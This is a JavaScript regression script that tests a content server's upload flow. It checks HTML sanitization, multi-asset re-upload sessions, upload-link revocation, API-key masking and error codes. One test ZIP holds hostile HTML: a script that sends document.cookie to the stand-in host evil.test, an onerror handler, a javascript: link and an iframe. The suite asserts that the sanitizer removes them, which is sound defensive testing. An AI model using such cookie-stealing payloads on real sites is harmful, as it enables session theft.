/**
 * Security and re-upload regression checks against a running server.
 *
 *   npm run dev                 # in one shell
 *   npm run verify:security     # in another
 *
 * Seeds its own admin account, so it needs only a reachable server and
 * DATABASE_URL. Exits non-zero if any check fails, so it can gate a deploy.
 * Covers the specific defects this suite was written for:
 *
 *   - contributor-supplied HTML is sanitized before storage
 *   - a re-upload session survives its first asset (the multi-asset bug)
 *   - upload links are scoped, and revoked once the session completes
 *   - integration secrets are never returned in full
 *   - malformed input produces 4xx rather than 5xx
 */
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import { promisify } from 'util';
import { execSync } from 'child_process';
import pg from 'pg';

const scryptAsync = promisify(crypto.scrypt);

// Overridable so this can run in CI against a different port.
const BASE = process.env.VERIFY_BASE_URL ?? 'http://localhost:3999';
let cookies = {};
let csrf = null;

const jar = () => Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');

function absorb(res) {
  const raw = res.headers.getSetCookie?.() ?? [];
  for (const c of raw) {
    const [pair] = c.split(';');
    const idx = pair.indexOf('=');
    cookies[pair.slice(0, idx)] = pair.slice(idx + 1);
  }
  if (cookies.csrf_token) csrf = cookies.csrf_token;
}

async function call(method, url, { body, headers = {}, form } = {}) {
  const h = { ...headers, Cookie: jar() };
  if (csrf && method !== 'GET') h['x-csrf-token'] = csrf;
  if (body && !form) h['Content-Type'] = 'application/json';

  const res = await fetch(BASE + url, {
    method,
    headers: h,
    body: form ?? (body ? JSON.stringify(body) : undefined),
    redirect: 'manual',
  });
  absorb(res);

  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch { /* html or empty */ }
  return { status: res.status, json, text };
}

const results = [];
function check(name, pass, detail = '') {
  results.push({ name, pass, detail });
  console.log(`${pass ? '  ✓' : '  ✗'} ${name}${detail ? ` — ${detail}` : ''}`);
}

// --- setup -----------------------------------------------------------------

// Seed the account these checks sign in with. Idempotent, so the suite can be
// run repeatedly and against a freshly migrated database.
const salt = crypto.randomBytes(16).toString('hex');
const derived = await scryptAsync('verify-password-123', salt, 64);
const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });
await pool.query(
  `INSERT INTO users (username, password, is_admin) VALUES ($1, $2, true)
   ON CONFLICT (username) DO UPDATE SET password = EXCLUDED.password, is_admin = true`,
  ['verifier', `${derived.toString('hex')}.${salt}`],
);
await pool.end();

await call('GET', '/api/health');
const login = await call('POST', '/api/login', {
  body: { username: 'verifier', password: 'verify-password-123' },
});
if (login.status !== 200) { console.error('login failed', login); process.exit(1); }

console.log('\n=== Re-upload session: the multi-asset flow that used to break ===');

const created = await call('POST', '/api/articles', {
  body: {
    title: 'Verification Article',
    author: 'Tester',
    imageUrl: 'https://example.com/a.png',
    status: 'published',
    finished: true,
    content: '<p>original body</p>',
    contentFormat: 'html',
  },
});
const articleId = created.json?.id;
check('create published article', created.status === 201 && !!articleId, `id=${articleId}`);

const session = await call('POST', `/api/articles/${articleId}/reupload`);
const uploadUrl = session.json?.uploadUrl;
const token = uploadUrl?.split('/').pop();
check('start session -> draft', session.json?.article?.status === 'draft');
check('start session -> isReuploading', session.json?.article?.isReuploading === true);
check('start session -> issues link', !!token, uploadUrl?.slice(0, 48));

// Contributor side: no session cookie, no CSRF header.
const savedCookies = cookies, savedCsrf = csrf;
cookies = {}; csrf = null;

const info = await call('GET', `/api/public-upload/${token}`);
check('contributor reads link info anonymously', info.status === 200, `title="${info.json?.article?.title}"`);
check('link advertises all three asset types', info.json?.uploadTypes?.length === 3, JSON.stringify(info.json?.uploadTypes));
check('link reports an open session', info.json?.isReuploadSession === true);

// Build a ZIP containing hostile HTML plus a CSS url() reference.
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'e2e-zip-'));
fs.writeFileSync(path.join(tmp, 'index.html'), `<!doctype html>
<h1>Replaced heading</h1>
<p>Safe paragraph.</p>
<script>window.__pwned = 1; fetch('https://evil.test/steal?c='+document.cookie);<\/script>
<img src="photo.png" onerror="alert(1)">
<div style="background-image: url('photo.png')">css ref</div>
<a href="javascript:alert(2)">bad link</a>
<iframe src="https://evil.test"></iframe>
`);
fs.writeFileSync(path.join(tmp, 'photo.png'), Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex'));
const zipPath = path.join(tmp, 'submission.zip');
execSync(`cd ${tmp} && zip -q -r submission.zip index.html photo.png`);

const form = new FormData();
form.append('file', new Blob([fs.readFileSync(zipPath)], { type: 'application/zip' }), 'submission.zip');
const zipRes = await call('POST', `/api/public-upload/${token}/html-zip`, { form, headers: {} });
check('contributor uploads ZIP', zipRes.status === 200, zipRes.json?.message ?? zipRes.text.slice(0, 80));

const storedHtml = zipRes.json?.html ?? '';
check('sanitizer removed <script>', !/<script/i.test(storedHtml));
check('sanitizer removed onerror=', !/onerror/i.test(storedHtml));
check('sanitizer removed <iframe>', !/<iframe/i.test(storedHtml));
check('sanitizer removed javascript: href', !/javascript:/i.test(storedHtml));
check('legitimate content survived', /Replaced heading/.test(storedHtml));
check('sanitization was reported', zipRes.json?.sanitized === true);

// THE regression. Old behaviour: the ZIP upload completed the session, flipped
// the article to published and revoked the link, so any further asset was
// rejected. Assert on the session state directly rather than on the second
// upload's status, which can also fail for unrelated reasons (no ImgBB key).
const stillOpen = await call('GET', `/api/public-upload/${token}`);
check(
  'session STILL OPEN after first asset (old code: auto-published here)',
  stillOpen.status === 200 && stillOpen.json?.isReuploadSession === true,
  `status=${stillOpen.status} isReuploadSession=${stillOpen.json?.isReuploadSession}`,
);

const img = new FormData();
img.append('file', new Blob([fs.readFileSync(path.join(tmp, 'photo.png'))], { type: 'image/png' }), 'cover.png');
const imgRes = await call('POST', `/api/public-upload/${token}/image`, { form: img, headers: {} });
// Authorization is what is under test: the old code answered 400 "Cannot upload
// to published articles". Anything that is not an auth rejection means the
// second asset was admitted.
const authRejected = [400, 401, 403].includes(imgRes.status);
check(
  'SECOND asset admitted, not auth-rejected (old code: 400)',
  !authRejected,
  `status=${imgRes.status} ${imgRes.json?.message ?? ''}`,
);

// Malformed upload must be rejected by the magic-byte check.
const fake = new FormData();
fake.append('file', new Blob([Buffer.from('<html>not a zip</html>')], { type: 'application/zip' }), 'fake.zip');
const fakeRes = await call('POST', `/api/public-upload/${token}/html-zip`, { form: fake, headers: {} });
check('non-ZIP disguised as ZIP rejected', fakeRes.status === 400, fakeRes.json?.message);

console.log('\n=== Token scoping and revocation ===');
const badToken = await call('GET', `/api/public-upload/${'0'.repeat(64)}`);
check('unknown token rejected', badToken.status === 401, badToken.json?.message);

// Back to the editor session.
cookies = savedCookies; csrf = savedCsrf;

const completed = await call('POST', `/api/articles/${articleId}/reupload/complete`);
check('complete session -> published', completed.json?.status === 'published', `status=${completed.json?.status}`);
check('complete session -> flag cleared', completed.json?.isReuploading === false);

cookies = {}; csrf = null;
const afterComplete = await call('GET', `/api/public-upload/${token}`);
check('link revoked after completion', afterComplete.status === 401, afterComplete.json?.message);
cookies = savedCookies; csrf = savedCsrf;

console.log('\n=== Secret redaction ===');
await call('POST', '/api/integration-settings', {
  body: { service: 'airtable', key: 'api_key', value: 'patSUPERSECRETVALUE1234', enabled: true },
});
const settings = await call('GET', '/api/integration-settings/airtable');
const apiKey = settings.json?.find?.((s) => s.key === 'api_key');
check('API key not returned in full', !JSON.stringify(settings.json ?? {}).includes('patSUPERSECRETVALUE1234'));
check('masked preview provided', typeof apiKey?.value === 'string' && apiKey.value.startsWith('••••'), apiKey?.value);

console.log('\n=== Error shape ===');
const badJson = await fetch(BASE + '/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Cookie: jar(), 'x-csrf-token': csrf },
  body: '{bad json',
});
check('malformed JSON -> 4xx not 500', badJson.status >= 400 && badJson.status < 500, `status=${badJson.status}`);

const badId = await call('GET', '/api/articles/not-a-number');
check('non-numeric id -> 400/404 not 500', badId.status < 500, `status=${badId.status}`);

// --- summary ---------------------------------------------------------------
fs.rmSync(tmp, { recursive: true, force: true });
const failed = results.filter((r) => !r.pass);
console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
if (failed.length) {
  console.log('FAILED:');
  for (const f of failed) console.log(`  - ${f.name} ${f.detail}`);
  process.exit(1);
}
